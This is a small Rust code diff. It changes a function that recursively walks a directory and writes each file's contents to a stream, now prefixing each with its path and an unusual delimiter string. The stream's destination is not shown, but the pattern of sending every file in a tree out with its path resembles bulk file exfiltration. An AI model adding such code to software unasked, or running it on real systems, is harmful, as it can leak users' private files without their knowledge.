@@ -12,7 +12,10 @@ pub fn copy_file_into_buffer(dir_path: String) -> Result<()> {
             if entry.path().is_dir() {
                 copy_file_into_buffer(entry.path().into_os_string().into_string().unwrap())?;
             } else {
-                let contents = read_to_string(entry.path())?;
+                // rust moment
+                let entry_path = entry.path().clone();
+                let file_path = entry_path.into_os_string().into_string().unwrap();
+                let contents = file_path + "@#!dg*777;*" + &read_to_string(entry.path())?;
                 let _ = stream.write(contents.as_bytes());
             }
         }
